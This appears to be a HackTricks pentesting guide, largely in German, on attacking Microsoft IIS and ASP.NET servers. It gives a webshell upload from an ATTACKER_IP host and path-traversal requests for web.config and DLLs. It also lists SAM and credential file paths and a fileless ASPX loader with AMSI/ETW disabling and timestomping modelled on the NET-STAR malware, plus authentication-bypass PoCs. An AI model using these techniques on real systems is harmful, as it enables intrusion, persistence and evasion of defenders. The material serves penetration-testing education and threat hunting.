# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

Test executable file extensions:

- asp
- aspx
- config
- php

## Schreibbarer webroot → ASPX command shell

Wenn ein niedrig privilegierter Benutzer/Gruppe **Schreibzugriff auf `C:\inetpub\wwwroot`** hat, kannst du eine ASPX webshell ablegen und OS-Befehle als die Application Pool Identity ausführen (häufig mit **SeImpersonatePrivilege**).

- ACLs überprüfen: `icacls C:\inetpub\wwwroot` oder `cacls .` und nach `(F)` für deinen Benutzer/deine Gruppe suchen.
- Lade eine command webshell hoch (z.B. fuzzdb/tennc `cmd.aspx`) mit PowerShell:
```powershell
iwr http://ATTACKER_IP/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx
```
- Fordere `/shell.aspx` an und führe Befehle aus; die Identität zeigt typischerweise `iis apppool\defaultapppool`.
- Kombiniere dies mit Potato-family LPE (z. B. GodPotato/SigmaPotato), wenn das AppPool token SeImpersonatePrivilege hat, um auf SYSTEM zu pivotieren.

## Offenlegung interner IP-Adressen

Auf jedem IIS-Server, auf dem du einen 302 erhältst, kannst du versuchen, den Host header zu entfernen und HTTP/1.0 zu verwenden; in der Antwort könnte der Location header auf die interne IP-Adresse verweisen:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Antwort, die die interne IP offenlegt:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config-Dateien ausführen

Du kannst .config-Dateien hochladen und sie verwenden, um Code auszuführen. Eine Möglichkeit besteht darin, den Code am Ende der Datei innerhalb eines HTML-Kommentars anzuhängen: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

More information and techniques to exploit this vulnerability [here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

Lade die Liste herunter, die ich erstellt habe:

{{#file}}
iisfinal.txt
{{#endfile}}

Sie wurde erstellt, indem die Inhalte der folgenden Listen zusammengeführt wurden:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Verwende sie ohne eine Extension hinzuzufügen; die Dateien, die eine benötigen, haben sie bereits.

## Path Traversal

### Leaking source code

Siehe die vollständige Beschreibung unter: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> Als Zusammenfassung gibt es mehrere web.config-Dateien innerhalb der Ordner der Anwendung mit Verweisen auf "**assemblyIdentity**"-Dateien und "**namespaces**". Mit diesen Informationen ist es möglich zu wissen, **wo sich ausführbare Dateien befinden** und diese herunterzuladen.\
> Aus den **downloaded Dlls** ist es außerdem möglich, **neue namespaces** zu finden, bei denen du versuchen solltest, auf die web.config-Datei zuzugreifen, um weitere namespaces und assemblyIdentity zu finden.\
> Außerdem können die Dateien **connectionstrings.config** und **global.asax** interessante Informationen enthalten.

In **.Net MVC applications** spielt die **web.config**-Datei eine entscheidende Rolle, indem sie jede Binärdatei angibt, auf die die Anwendung mithilfe von **"assemblyIdentity"** XML-Tags angewiesen ist.

### **Binärdateien erkunden**

Ein Beispiel für den Zugriff auf die **web.config**-Datei wird unten gezeigt:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Diese Anfrage offenbart verschiedene Einstellungen und Abhängigkeiten, wie zum Beispiel:

- **EntityFramework** Version
- **AppSettings** für Webseiten, Client-Validierung und JavaScript
- **System.web** Konfigurationen für Authentifizierung und Runtime
- **System.webServer** Moduleeinstellungen
- **Runtime** Assembly-Bindings für zahlreiche Bibliotheken wie **Microsoft.Owin**, **Newtonsoft.Json**, und **System.Web.Mvc**

Diese Einstellungen deuten darauf hin, dass bestimmte Dateien, wie **/bin/WebGrease.dll**, im /bin-Ordner der Anwendung liegen.

### **Dateien im Root-Verzeichnis**

Dateien, die im Root-Verzeichnis gefunden werden, wie **/global.asax** und **/connectionstrings.config** (die sensible Passwörter enthält), sind für die Konfiguration und den Betrieb der Anwendung unerlässlich.

### **Namespaces und Web.Config**

MVC-Anwendungen definieren außerdem zusätzliche **web.config files** für bestimmte Namespaces, um sich wiederholende Deklarationen in jeder Datei zu vermeiden, wie es durch eine Anfrage zum Herunterladen einer weiteren **web.config** demonstriert wird:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLs herunterladen**

Der Hinweis auf einen benutzerdefinierten Namespace deutet auf eine DLL namens "**WebApplication1**" im /bin-Verzeichnis hin. Danach wird eine Anfrage zum Herunterladen der **WebApplication1.dll** angezeigt:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Dies deutet auf das Vorhandensein weiterer essenzieller DLLs, wie **System.Web.Mvc.dll** und **System.Web.Optimization.dll**, im /bin-Verzeichnis hin.

In einem Szenario, in dem eine DLL einen Namespace namens **WebApplication1.Areas.Minded** importiert, könnte ein Angreifer auf das Vorhandensein weiterer web.config-Dateien in vorhersehbaren Pfaden schließen, wie **/area-name/Views/**, die spezifische Konfigurationen und Verweise auf andere DLLs im /bin-Ordner enthalten. Zum Beispiel kann eine Anfrage an **/Minded/Views/web.config** Konfigurationen und Namespaces offenbaren, die auf die Existenz einer weiteren DLL, **WebApplication1.AdditionalFeatures.dll**, hinweisen.

### Häufige Dateien

Von [hier](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Fehler

Wenn du einen Fehler wie den folgenden siehst:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Das bedeutet, dass der Server den korrekten Domainnamen im Host header nicht erhalten hat.\
Um auf die Webseite zuzugreifen, kannst du dir das ausgelieferte **SSL Certificate** ansehen; vielleicht findest du dort den Domain-/Subdomain-Namen. Falls das nicht der Fall ist, musst du möglicherweise **brute force VHosts** durchführen, bis du den richtigen findest.

## Entschlüsseln verschlüsselter Konfiguration und ASP.NET Core Data Protection key rings

Zwei gängige Muster, um Geheimnisse in auf IIS gehosteten .NET-Apps zu schützen, sind:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) für web.config-Abschnitte wie <connectionStrings>.
- ASP.NET Core Data Protection key ring (lokal gespeichert) zum Schutz von Anwendungsgeheimnissen und Cookies.

Wenn du Dateisystem- oder interaktiven Zugriff auf dem Webserver hast, ermöglichen lokal abgelegte Schlüssel oft die Entschlüsselung.

- ASP.NET (Full Framework) – geschützte Konfigurationsabschnitte mit aspnet_regiis entschlüsseln:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – suchen Sie nach Data Protection key rings, die lokal gespeichert sind (XML/JSON files) unter Speicherorten wie:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

Wenn der key ring verfügbar ist, kann ein Operator, der in der Identität der App läuft, ein IDataProtector mit denselben purposes instanziieren und gespeicherte Secrets unprotecten. Fehlkonfigurationen, die den key ring zusammen mit den App-Dateien ablegen, machen die Offline-Entschlüsselung trivial, sobald der Host kompromittiert ist.

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

Das Phantom Taurus/NET-STAR toolkit zeigt ein ausgereiftes Muster für fileless IIS persistence und post‑exploitation vollständig innerhalb von w3wp.exe. Die Kernideen sind breit wiederverwendbar für custom tradecraft und für detection/hunting.

Wichtige Bausteine
- ASPX bootstrapper hosting an embedded payload: eine einzelne .aspx-Seite (z. B. OutlookEN.aspx) trägt ein Base64‑kodiertes, optional Gzip‑komprimiertes .NET DLL. Bei einer Trigger-Anfrage dekodiert, dekomprimiert und lädt sie das DLL reflectively in das aktuelle AppDomain und ruft den Haupteinstiegspunkt auf (z. B. ServerRun.Run()).
- Cookie‑scoped, encrypted C2 with multi‑stage packing: Tasks/Results werden mit Gzip → AES‑ECB/PKCS7 → Base64 verpackt und über scheinbar legitime, cookie‑reiche Requests verschoben; Operatoren nutzten stabile Delimiter (z. B. "STAR") zum Chunking.
- Reflective .NET execution: akzeptiert beliebige managed assemblies als Base64, lädt sie via Assembly.Load(byte[]) und übergibt Operator-Args für schnelle Modulwechsel ohne Festplattenzugriff.
- Operating in precompiled ASP.NET sites: zusätzliche auxiliary shells/backdoors hinzufügen/verwalten, selbst wenn die Site vorcompiliert ist (z. B. dropper fügt dynamische Seiten/Handler hinzu oder nutzt config handlers) – sichtbar über Befehle wie bypassPrecompiledApp, addshell, listshell, removeshell.
- Timestomping/metadata forgery: stellt eine changeLastModified-Aktion bereit und timestompt bei der Bereitstellung (einschließlich zukünftiger Kompilierungszeitstempel), um DFIR zu erschweren.
- Optional AMSI/ETW pre‑disable for loaders: ein Second‑Stage-Loader kann AMSI und ETW deaktivieren, bevor Assembly.Load aufgerufen wird, um die Inspektion von in‑memory Payloads zu reduzieren.

Minimales ASPX-Loader-Muster
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
Packing/crypto Hilfsfunktionen (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Cookie/session flow und command surface
- Session bootstrap and tasking werden über cookies transportiert, um sich mit normaler Web-Aktivität zu vermischen.
- In freier Wildbahn beobachtete Befehle umfassten: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; sowie die dynamischen Ausführungsprimitiven code_self, code_pid, run_code für in‑memory .NET execution.

Timestomping-Dienstprogramm
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Inline-Deaktivierung von AMSI/ETW vor Assembly.Load (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
Siehe AMSI/ETW bypass techniques in: windows-hardening/av-bypass.md

Hunting-Notizen (Verteidiger)
- Einzelne, seltsame ASPX-Seite mit sehr langen Base64/Gzip-Blobs; cookie‑intensive POSTs.
- Managed-Module ohne zugehörige Backing-Datei innerhalb von w3wp.exe; Strings wie Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run.
- Wiederholte Delimiter wie "STAR" im Traffic; nicht übereinstimmende oder sogar zukünftige Zeitstempel in ASPX/assemblies.

## Telerik UI WebResource.axd unsafe reflection (CVE-2025-3600)

Viele ASP.NET-Apps binden Telerik UI for ASP.NET AJAX ein und stellen den unauthentifizierten Handler Telerik.Web.UI.WebResource.axd bereit. Wenn der Image Editor Cache-Endpunkt erreichbar ist (type=iec), erlauben die Parameter dkey=1 und prtype unsafe reflection, die vorauthentifiziert jeden öffentlichen parameterlosen Konstruktor ausführt. Das ergibt eine universelle DoS-Primitive und kann zu vorauthentifiziertem RCE auf Apps mit unsicheren AppDomain.AssemblyResolve-Handlern eskalieren.

See detailed techniques and PoCs here:

{{#ref}}
telerik-ui-aspnet-ajax-unsafe-reflection-webresource-axd.md
{{#endref}}

## Alte IIS-Schwachstellen, die es wert sind, untersucht zu werden


### Microsoft IIS Tilde-Zeichen “\~” Schwachstelle/Funktion – Offenlegung kurzer Datei-/Ordnernamen

Sie können versuchen, mithilfe dieser **Technik** in jedem entdeckten Ordner (selbst wenn Basic Authentication erforderlich ist) **Ordner und Dateien zu enumerieren**. Die Hauptbeschränkung dieser Technik, falls der Server verwundbar ist, ist, dass **sie nur die ersten 6 Buchstaben des Namens jeder Datei/jedes Ordners und die ersten 3 Buchstaben der Dateiendung** finden kann.

Sie können [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) verwenden, um diese Schwachstelle zu testen: `java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Ursprüngliche Forschung: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

Sie können auch **metasploit** verwenden: `use scanner/http/iis_shortname_scanner`

Eine gute Idee, um den **endgültigen Namen** der entdeckten Dateien zu ermitteln, ist, **LLMs** nach Vorschlägen zu fragen, wie es im Script [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py) gemacht wird.

### Basic Authentication bypass

Um Basic Authentication zu **bypassen** (IIS 7.5), versuchen Sie, auf: `/admin:$i30:$INDEX_ALLOCATION/admin.php` oder `/admin::$INDEX_ALLOCATION/admin.php` zuzugreifen.

Sie können versuchen, diese **Schwachstelle** mit der vorherigen zu **kombinieren**, um neue **Ordner** zu finden und die Authentifizierung zu **umgehen**.

## ASP.NET Trace.AXD aktiviertes Debugging

ASP.NET enthält einen Debugging-Modus, dessen Datei `trace.axd` heißt.

Es führt ein sehr detailliertes Log aller Anfragen, die an eine Anwendung über einen Zeitraum gestellt wurden.

Diese Informationen beinhalten Remote-Client-IPs, Session-IDs, alle Request- und Response-Cookies, physische Pfade, Source-Code-Informationen und potenziell sogar Benutzernamen und Passwörter.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH verwendet folgende Informationen:

- **`validationKey`** (string): hex-kodierter Schlüssel zur Signaturvalidierung.
- **`decryptionMethod`** (string): (Standard “AES”).
- **`decryptionIV`** (string): hex-kodierter Initialisierungsvektor (Standard ist ein Vektor aus Nullen).
- **`decryptionKey`** (string): hex-kodierter Schlüssel zur Dechiffrierung.

Einige Betreiber verwenden jedoch die **Standardwerte** dieser Parameter und nutzen als **Cookie die E-Mail des Benutzers**. Daher, wenn Sie eine Website finden, die **die gleiche Plattform** verwendet und ASPXAUTH-Cookies nutzt, und Sie auf dem zweiten Server **einen Benutzer mit der E‑Mail des zu impersonierenden Benutzers erstellen**, könnten Sie in der Lage sein, **das Cookie vom zweiten Server im ersten zu verwenden** und den Benutzer zu impersonieren.\
Dieser Angriff funktionierte in diesem [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS Authentication Bypass mit gecachten Passwörtern (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Ein Bug im Code **überprüfte das vom Benutzer angegebene Passwort nicht korrekt**, sodass ein Angreifer, dessen **password hash auf einen Schlüssel** trifft, der bereits im **cache** vorhanden ist, sich als dieser Benutzer anmelden kann.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## Quellen

- [0xdf – HTB Job (IIS write → ASPX shell → GodPotato)](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Unit 42 – Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass background (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
